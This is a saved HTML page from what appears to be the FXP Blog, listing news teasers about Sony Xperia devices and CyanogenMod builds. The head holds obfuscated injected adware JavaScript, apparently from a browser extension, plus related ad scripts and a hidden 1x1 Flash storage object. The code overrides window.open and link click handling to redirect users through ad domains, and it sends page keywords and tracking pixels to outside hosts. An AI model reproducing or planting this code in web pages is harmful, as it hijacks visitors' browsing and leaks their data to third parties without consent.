a.contentWindow}};a.prefix='fghjktghndfgtssss';a.extName='compareItApplic';a.version='0.1.1';a.pop_collision_id='__ipm=';a.pixelHostname=function(){try{return'//mnh.'+eval('["winnerica.org","winnershed.info"]')['https:'==window.self.location.protocol?1:0]}catch(a){return['//mnh.winneri.info','//mnh.winnermore.org']['https:'==window.self.location.protocol?1:0]}}();a.watcherCount=0;a.fallbackHostnames=['compey.net','comprises.info'];try{a.stngs=a.utils.JSON.parse('{"szy_domain":["unitspybookukset.net","comprises.info"],"ad_sizes":[[120,60,19],[630,250,22],[336,280,17],[630,500,23],[180,150,18],[234,60,15],[200,200,16],[600,400,13],[125,125,14],[670,670,11],[600,270,12],[800,600,21],[468,60,3],[800,440,20],[300,250,2],[728,90,1],[300,600,10],[120,240,7],[120,600,6],[160,600,5],[250,250,4],[240,400,8]]}')}catch(q){a.hostnames=a.fallbackHostnames}var p;p=''!==a.stngs&&a.stngs&&'undefined'!==typeof a.stngs.szy_domain&&a.stngs.szy_domain instanceof Array?a.stngs.szy_domain:a.fallbackHostnames;a.hostnames=p;a.debugMode&&(a.debug=new function(){var b=this;window.oldSetTimeout=window.setTimeout;window.oldSetInterval=window.setInterval;b.overrideSettimeout=function(){window.setTimeout=function(a,b){return window.oldSetTimeout(function(){try{console.log('%csetTimeout: '+a.toString(),'color:purple'),a()}catch(b){}},b)}};b.overrideSetinterval=function(){window.setInterval=function(a,b){return window.oldSetInterval(function(){try{console.log('setInterval: '+a.toString()),a()}catch(b){}},b)}};b.overrideVariables=function(){a.pid='12';a.cc='US';a.eid='10';a.hid='123456789';a.ename='QA extension';a.lt='2617.24';a.jpshort='_OXQj15i';a.platform_version='10'};b.init=function(){b.overrideSettimeout();b.overrideSetinterval();b.overrideVariables()};b.init()});a.legacyHostnames=['superiends.org','go.turboloves.net','installerapplicationusa.com','stylene.net'];a.body=document.getElementsByTagName('body')[0];a.params={subid:a.pid,subid1:a.hid,subid2:a.eid,'px.pluginh':1,tid:'7',red:'1',subid3:'mnhadz'};a.manhattanCookieInterval=0.0015;a.events=new function(){var a=this;a.cache=[];a.add=window.addEventListener?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e.addEventListener(c,d,g);f&&a.cache.push([c,d,g,e])}:window.attachEvent?function(c,d,g,e,f){'undefined'==typeof e&&(e=window);e['e'+c+d]=d;e[c+d]=function(){e['e'+c+d](window.event)};e.attachEvent('on'+c,e[c+d]);f&&a.cache.push([c,d,g,e])}:function(){};a.remove=window.removeEventListener?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.removeEventListener(a,b,g)}:window.detachEvent?function(a,b,g,e){'undefined'==typeof e&&(e=window);e.detachEvent('on'+a,e[a+b]);e[a+b]=null;e['e'+a+b]=null}:function(){};a.flush=function(){for(var c=0;c<a.cache.length;c++)a.remove.apply(a,a.cache[c]);a.cache=[]}};a.pixel=function(b,c){var d=a.pixelHostname+'?',g=a.hostnames[0],g={pid:a.pid,cc:a.cc,eid:a.eid,hid:a.hid,v:a.version,ch:b,cid:0,tid:a.params.tid,adtid:0,smid:0,pbid:'0',oh:encodeURIComponent(c),sh:encodeURIComponent(g)},e;for(e in g)d+=e+'='+g[e]+'&';d=d.slice(0,-1);if(21===b)return d=d.split('?')[1],a.utils.l.encode(d);(new Image).src=d};a.getKeywords=function(){var a=document.title,c=document.getElementsByTagName('meta');if(c)for(var d=0,g=c.length;d<g;d++)'keywords'!=c[d].name.toLowerCase()&&'description'!=c[d].name.toLowerCase()||(a+=' '+c[d].content.replace(/,/g,' '));if(d=document.getElementsByTagName('a')){c={};for(g=0;g<d.length;g++)try{var e=d[g].innerText;'undefined'==typeof e&&(e=d[g].textContent);for(var f=e.toLowerCase().split(/[\s,-]/g),h=0;h<f.length;h++)4>f[h].length||(c[f[h]]?c[f[h]]++:c[f[h]]=1)}catch(l){}var e=[],k;for(k in c)e.push([k,c[k]]);e.sort(function(a,b){return b[1]-a[1]});e=e.slice(0,25);for(k=0;k<e.length;k++)a+=' '+e[k][0]}return encodeURIComponent(a.replace(/[\!\[\]_-]/g,' ').trim().substring(0,1500))};a.isFalseResponseFromServer=function(){-1<a.body.innerText.indexOf('e7hZBzqVfn==')&&window.close()};a.checkIfServer=function(){for(var b=0;b<a.hostnames.length;b++)if(location.hostname===a.hostnames[b])return a.isFalseResponseFromServer(),!0};a.checkIfPop=function(b,c,d){return!(d+'').match(/^InterYield/i)&&!(d+'').match(/(a652c|ld893)_/)&&'r_ron_redir'!==d&&-1==document.cookie.indexOf('xcddsa')&&-1==b.indexOf('px.pluginh')&&-1==b.indexOf('earchfu')&&-1==location.href.indexOf('/amz/')&&-1==location.href.indexOf('/sd/dw32.html')&&-1==location.href.indexOf('/pop/1.1.00')&&!location.href.match(/cpops-\d+\.html/)&&-1==location.href.indexOf('px.pluginh')&&-1==b.indexOf('nkths.co')&&-1==b.indexOf('ally.asi')&&-1==b.indexOf('/sd/dw32.html')&&-1==b.indexOf('/pop/1.1.00')&&-1==b.indexOf('/amz/')&&!b.match(/cpops-\d+\.html/)&&-1==a.utils.getHostName(b).indexOf('getjs')&&-1==a.utils.getHostName(b).indexOf('hsbc')};window.self==window.top&&a.pixel(10,'0');-1<window.location.href.indexOf(a.pop_collision_id)&&window.self==window.top&&a.pixel(13,'0');a.addBlurredTabListener=function(b){var c;try{c=a.utils.getHostName(b.target.getAttribute('href'))}catch(d){c=''}'a'==b.target.tagName.toLowerCase()&&''==b.target.innerHTML&&b.target.getAttribute('href')&&!b.target.getAttribute('download')&&-1==c.indexOf(window.self.location.hostname)&&(c=b.target.getAttribute('href')?b.target.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),b.target.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),b.target.setAttribute('href',a.manhattanUrl),document.getElementsByTagName('body')[0].removeEventListener('click',a.addBlurredTabListener))};a.prepareUrl=function(b){b='?';for(var c in a.params)b+=c+'='+a.params[c]+'&';b+='k='+a.getKeywords();return'http://'+a.hostnames[0]+b};try{window.top==window.self&&-1==document.cookie.indexOf('vdsknj4th4uh')&&window.name!==a.prefix&&a.overrideDispatchEvent()}catch(r){}a.checkIfServer()||(a.cachedOpenFn=window.open,a.overrideDispatchEvent=function(){a.cachedDispatchEvent=document.createElement('a').constructor.prototype.dispatchEvent;document.createElement('a').constructor.prototype.dispatchEvent=function(b){var c;try{c=a.utils.getHostName(event.target.getAttribute('href'))}catch(d){c=''}'a'==this.tagName.toLowerCase()&&''==this.innerHTML&&'click'==b.type&&-1==c.indexOf(window.self.location.hostname)&&this.getAttribute('href')&&!this.getAttribute('download')&&(c=this.getAttribute('href')?this.getAttribute('href'):'0',a.manhattanUrl=a.prepareUrl(c),a.pixel(12,c),this.setAttribute('target',a.prefix),c=new Date,c.setMinutes(c.getMinutes()+15),a.utils.cookie.setCookie('vdsknj4th4uh','1',c.toUTCString()),this.setAttribute('href',a.manhattanUrl));a.cachedDispatchEvent.call(this,b)}},a.checkIfPartner=function(a){return'Za'==a},a.overrideWindowOpen=function(){clearTimeout(a.timeout);window.open=function(b){return function(c,d,g){window.self==window.top&&a.pixel(11,'0');b=a.cachedOpenFn;if(a.checkIfPop(c,g,d))return d=new Date,d.setMinutes(d.getMinutes()+15),a.utils.cookie.setCookie('xcddsa','1',d.toUTCString()),a.manhattanUrl=a.prepareUrl(c),d=a.prefix,a.pixel(20,c),a.manhattanOn=!0,a.utils.msie&&9>a.utils.msie?window.open(a.manhattanUrl,d,g):b.call(window,a.manhattanUrl,d,g);d=d||'';window.open=a.cachedOpenFn;return a.utils.msie&&9>a.utils.msie?window.open(c,d,g):b.call(window,c,d,g)}}(window.open);4<a.watcherCount||a.manhattanOn||(a.watcherCount++,a.openWatcher())},a.overrideDispatchEvent(),a.openWatcher=function(){a.timeout=setTimeout(a.overrideWindowOpen,200)},a.openWatcher(),'undefined'==typeof window[a.prefix]&&(window[a.prefix]=a))}};};fghjktghndfgt_init()</script><script id="id_kjshdasdfkjhsdf" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/sg_bg.js" type="text/javascript"></script><script data-sifi-parsed="true" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/dpx.js" type="text/javascript" async=""></script><script id="_GPL_a652c2" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/itn.js" type="text/javascript" async=""></script><script id="_GPL_z7b85" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/z7b85.js" type="text/javascript" async=""></script><style type="text/css">a.gpl-intext-disclosure-text{ text-decoration: none; } a.gpl-intext-disclosure-text:hover { text-decoration: underline; }</style><script src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/pops" type="text/javascript" async=""></script></head>
+
+
+<body s15822617355930755353="1" jhjlijpomuhn_m="l" fullbleed=""><div id="_GPL_e6a00_parent_div" style="position: absolute; top: 0px; left: 0px; width: 1px; height: 1px; z-index: 2147483647;"><object data="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/storage.swf" id="_GPL_e6a00_swf" type="application/x-shockwave-flash" height="1" width="1"><param value="transparent" name="wmode"><param value="always" name="allowscriptaccess"><param value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl" name="flashvars"></object></div>
+<core-scaffold id="scaffold">
+
+  
+
+  <core-drawer-panel touch-action="" id="drawerPanel" drawerwidth="{{drawerWidth}}" rightdrawer="{{rightDrawer}}" responsivewidth="{{responsiveWidth}}" disableswipe="{{disableSwipe}}">
+
+  
+
+  <core-media-query query="max-width: {{forceNarrow ? '' : responsiveWidth}}" querymatches="{{queryMatches}}">
+    
+  </core-media-query>
+
+  <core-selector class="transition" valueattr="id" selected="{{selected}}">
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <div style="left: 256px; right: ;" id="main" _style="left: {{ narrow || rightDrawer ? '0' : drawerWidth }}; right: {{ rightDrawer ? (narrow ? '' : drawerWidth) : '' }};">
+      <core-header-panel id="headerPanel" main="" mode="seamed">
+
+  
+
+  <div id="outerContainer" vertical="" layout="">
+
+    <core-toolbar>
+
+  
+
+  <div id="bottomBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+  </div>
+
+  <div id="middleBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+  </div>
+
+  <div id="topBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+        <template if="{{!rightDrawer}}"></template>
+          <core-icon-button id="menuButton" icon="menu" on-tap="{{ togglePanel }}">
+    
+    <core-icon role="img" aria-label="menu" src="%7B%7Bsrc%7D%7D" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></g></svg></core-icon>
+  </core-icon-button>
+        
+        <core-toolbar tool="" flex="">
+
+  
+
+  <div id="bottomBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+  </div>
+
+  <div id="middleBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+  </div>
+
+  <div id="topBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+    <!-- flex spaces this element and jusifies the icons to the right-side -->
+    <div flex=""><strong><a id="toolbar" href="http://fxpblog.co/">FXP Blog</a></strong></div>
+
+  </div>
+
+</core-toolbar>
+        <template if="{{rightDrawer}}"></template>
+      
+  </div>
+
+</core-toolbar>
+
+    <div id="mainPanel" flex="" vertical="" layout="">
+
+      <div flex="" id="mainContainer">
+        <div class="content_padding_outer" layout="" fit="">
+<div class="content_padding_inner" layout="" fit="">
+    <!-- fill with pages -->
+	<section class="content row">
+		<div style="padding: 10px 0;">
+<material-card class="article">
+    
+
+    <paper-shadow id="shadow" animated="true">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+    <paper-ripple>
+
+  
+
+  <div id="bg"></div>
+  <div id="waves">
+  </div>
+
+</paper-ripple>
+        <div class="content">
+            
+	<img style="width:100%; max-height:600px; border-radius: 5px;" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/2015-03-01-sony-introduces-xperia-z4-at-mwc2015.jpg">
+	<h1>Sony introduces Xperia Z4 tablet and Xperia M4 aqua at MWC2015</h1>
+	Sony Mobile's next generation Z series of devices are coming, however 
+not all at once. Unlike like the Z3 Phones and tablets introduced at 
+IFA2014, Sony Mobile has chosen to spread the launch of the next 
+generation...
+	<div style="margin-top: 20px;">
+		<a href="http://fxpblog.co/2015/03/01/sony-introduces-xperia-z4-at-mwc2015.html">
+			<paper-button tabindex="0" role="button" raised="" class="more">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+				<core-icon role="img" aria-label="forward" icon="forward"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M12 8V4l8 8-8 8v-4H4V8z"></path></g></svg></core-icon>
+				Learn more
+			
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+		</a>
+	</div>
+
+        
+    
+  </div>
+
+</paper-shadow></material-card>
+
+<material-card class="article">
+    
+
+    <paper-shadow id="shadow" animated="true">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+    <paper-ripple>
+
+  
+
+  <div id="bg"></div>
+  <div id="waves">
+  </div>
+
+</paper-ripple>
+        <div class="content">
+            
+	<img style="width:100%; max-height:600px; border-radius: 5px;" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/2015-03-01-builds-of-cyanogenmod-11-end-with-stable-build.jpg">
+	<h1>PSA: Builds of CyanogenMod 11 end with stable build</h1>
+	It's hard to believe but Android 4.4 KitKat was released 18 months ago,
+ in September 2013. CyanogenMod 11 was introduced shortly after that, 
+and became a successful product in its own right. However all...
+	<div style="margin-top: 20px;">
+		<a href="http://fxpblog.co/2015/03/01/builds-of-cyanogenmod-11-end-with-stable-build.html">
+			<paper-button tabindex="0" role="button" raised="" class="more">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+				<core-icon role="img" aria-label="forward" icon="forward"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M12 8V4l8 8-8 8v-4H4V8z"></path></g></svg></core-icon>
+				Learn more
+			
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+		</a>
+	</div>
+
+        
+    
+  </div>
+
+</paper-shadow></material-card>
+
+<material-card class="article">
+    
+
+    <paper-shadow id="shadow" animated="true">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+    <paper-ripple>
+
+  
+
+  <div id="bg"></div>
+  <div id="waves">
+  </div>
+
+</paper-ripple>
+        <div class="content">
+            
+	<img style="width:100%; max-height:600px; border-radius: 5px;" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/2015-01-26-welcome-to-fxpblog-2-0.jpg">
+	<h1>Welcome to FXP Blog 2.0</h1>
+	FXP Blog has provided you with the latest and greatest software for 
+your Xperia devices, yet this website has been running on software for 
+the digital stone age. Gone is the PHP based WordPress site that needs a
+ dedicated...
+	<div style="margin-top: 20px;">
+		<a href="http://fxpblog.co/2015/01/26/welcome-to-fxpblog-2-0.html">
+			<paper-button tabindex="0" role="button" raised="" class="more">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+				<core-icon role="img" aria-label="forward" icon="forward"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M12 8V4l8 8-8 8v-4H4V8z"></path></g></svg></core-icon>
+				Learn more
+			
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+		</a>
+	</div>
+
+        
+    
+  </div>
+
+</paper-shadow></material-card>
+
+<material-card class="article">
+    
+
+    <paper-shadow id="shadow" animated="true">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+    <paper-ripple>
+
+  
+
+  <div id="bg"></div>
+  <div id="waves">
+  </div>
+
+</paper-ripple>
+        <div class="content">
+            
+	<img style="width:100%; max-height:600px; border-radius: 5px;" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/2014-12-25-aosp-lollipop-release.jpg">
+	<h1>AOSP Lollipop release from FXP, just in time for Christmas!</h1>
+	We recently wrote about AOSP repos available from Sony Mobile for many 
+Xperia devices. Today, just in time for Christmas, we are starting AOSP 
+Lollipop nightly builds. All devices previously mentioned to get AOSP 
+Lollipop...
+	<div style="margin-top: 20px;">
+		<a href="http://fxpblog.co/2014/12/25/aosp-lollipop-release.html">
+			<paper-button tabindex="0" role="button" raised="" class="more">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+				<core-icon role="img" aria-label="forward" icon="forward"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M12 8V4l8 8-8 8v-4H4V8z"></path></g></svg></core-icon>
+				Learn more
+			
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+		</a>
+	</div>
+
+        
+    
+  </div>
+
+</paper-shadow></material-card>
+
+<material-card class="article">
+    
+
+    <paper-shadow id="shadow" animated="true">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+    <paper-ripple>
+
+  
+
+  <div id="bg"></div>
+  <div id="waves">
+  </div>
+
+</paper-ripple>
+        <div class="content">
+            
+	<img style="width:100%; max-height:600px; border-radius: 5px;" src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/2014-11-04-fxp344-brings-cyanogenmod-11-support-to-sony-xper.jpg">
+	<h1>FXP344 brings CyanogenMod 11 support to Sony Xperia T2 Ultra</h1>
+	It's been a while since our last device but FXP is happy to announce 
+support for Sony Xperia T2 Ultra! Sony Xperia T2 Ultra was announced at 
+CES2014 in January, but it didn't become available until several months 
+later...
+	<div style="margin-top: 20px;">
+		<a href="http://fxpblog.co/2014/11/04/fxp344-brings-cyanogenmod-11-support-to-sony-xperia-t2-ultra.html">
+			<paper-button tabindex="0" role="button" raised="" class="more">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+				<core-icon role="img" aria-label="forward" icon="forward"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M12 8V4l8 8-8 8v-4H4V8z"></path></g></svg></core-icon>
+				Learn more
+			
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+		</a>
+	</div>
+
+        
+    
+  </div>
+
+</paper-shadow></material-card>
+
+
+<!-- Pagination links -->
+<div class="pagination">
+	
+	<a href="http://fxpblog.co/page2" class="next">
+		<paper-button tabindex="0" role="button" raised="" class="next">
+
+    
+
+    <template if="{{raised}}"></template>
+      <paper-shadow id="shadow" fit="" animated="">
+
+  <div animated="" id="shadow-bottom" fit="" class="paper-shadow-bottom-z-1"></div>
+  <div animated="" id="shadow-top" fit="" class="paper-shadow-top-z-1"></div>
+
+  
+
+</paper-shadow>
+    
+
+    <!-- this div is needed to position the ripple behind text content -->
+    <div class="button-content" relative="" layout="" horizontal="" center-center="">
+      
+			<core-icon role="img" aria-label="arrow-back" icon="arrow-back"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></g></svg></core-icon>
+			Older
+		
+    </div>
+
+    <core-a11y-keys keys="space enter" target="{{}}" on-keys-pressed="{{ _activate }}"></core-a11y-keys>
+
+  </paper-button>
+	</a>
+	
+	
+</div></div>
+	</section>
+</div>
+</div>
+      </div>
+
+      <div class="hidden" id="dropShadow"></div>
+
+    </div>
+
+  </div>
+
+</core-header-panel>
+      <div id="scrim" on-tap="{{ togglePanel }}"></div>
+      <div id="edgeSwipeOverlay" hidden=""></div>
+    </div><div style="width: 256px" id="drawer" _style="width: {{ drawerWidth }}">
+      <div vertical="" layout="" drawer="">
+
+      <core-header-panel navigation="" flex="" mode="waterfall">
+
+  
+
+  <div id="outerContainer" vertical="" layout="">
+
+    <core-toolbar class="tall">
+
+  
+
+  <div id="bottomBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+  </div>
+
+  <div id="middleBar" class="toolbar-tools" center="" horizontal="" layout="">
+    <div class="middle">
+        <a id="toolbar" href="http://fxpblog.co/"><img src="FXP%20Blog%20_%20News%20for%20Sony%20Mobile%20Xperia%20devices,%20CyanogenMod,%20and%20Android_files/fxp-logo-2x.png" alt="FXP Logo" height="140px" width="224px"></a>
+    </div>
+  </div>
+
+  <div id="topBar" class="toolbar-tools" center="" horizontal="" layout="">
+    
+    
+
+  </div>
+
+</core-toolbar>
+
+    <div id="mainPanel" flex="" vertical="" layout="">
+
+      <div flex="" id="mainContainer">
+        <core-menu theme="core-light-theme">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-submenu icon="info-outline" label="What is FXP?">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+    <core-icon role="img" aria-label="info-outline" src="%7B%7Bsrc%7D%7D" id="icon" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path d="M11 17h2v-6h-2v6zm1-15C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 9h2V7h-2v2z"></path></g></svg></core-icon>
+  
+  <div id="label">What is FXP?</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="About Us">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">About Us</div>
+  <a href="http://fxpblog.co/about/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Members">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Members</div>
+  <a href="http://fxpblog.co/about/members/"></a>
+</core-item><core-item horizontal="" center="" layout="" label="Contact">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Contact</div>
+  <a href="http://fxpblog.co/about/contact/"></a>
+</core-item>
+  
+
+</core-menu>
+
+  <core-collapse class="core-collapse-closed" target="{{$.submenu}}" opened="{{opened}}">
+
+  
+
+</core-collapse>
+
+</core-submenu><core-submenu icon="device:battery-90" label="Active Devices">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+    <core-icon role="img" aria-label="battery-90" src="%7B%7Bsrc%7D%7D" id="icon" icon="{{icon}}"><svg fit="" preserveAspectRatio="xMidYMid meet" width="100%" height="100%" style="pointer-events: none; display: block;" viewBox="0 0 24 24"><g><path fill-opacity=".3" d="M17 5.33C17 4.6 16.4 4 15.67 4H14V2h-4v2H8.33C7.6 4 7 4.6 7 5.33V8h10V5.33z"></path><path d="M7 8v12.67C7 21.4 7.6 22 8.33 22h7.33c.74 0 1.34-.6 1.34-1.33V8H7z"></path></g></svg></core-icon>
+  
+  <div id="label">Active Devices</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="enter" on-keys-pressed="{{ validateSelected }}"></core-a11y-keys>
+
+  
+    <core-selection id="selection" multi="{{multi}}" on-core-select="{{ selectionSelect }}" hidden=""></core-selection>
+    <core-item horizontal="" center="" layout="" label="Overview">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Overview</div>
+  <a href="http://fxpblog.co/active/"></a>
+</core-item><core-submenu label="Cortex-A53 Family">
+
+  
+
+  <core-item horizontal="" center="" layout="" id="submenuItem" src="%7B%7Bsrc%7D%7D" label="{{label}}" icon="{{icon}}" class="" on-tap="{{ activate }}">
+  
+  <template if="{{icon || src}}"></template>
+  <div id="label">Cortex-A53 Family</div>
+  
+    
+  
+</core-item>
+
+  <core-menu class="core-collapse-closed" style="overflow: hidden;" id="submenu" selected="{{selected}}" selecteditem="{{selectedItem}}" selectedattribute="{{selectedAttribute}}" valueattr="{{valueattr}}">
+
+  
+
+  <core-a11y-keys target="{{}}" keys="up" on-keys-pressed="{{ selectPrevious }}"></core-a11y-keys>
+  <core-a11y-keys target="{{}}" keys="down" on-keys-pressed="{{ selectNext }}"></core-a11y-keys>
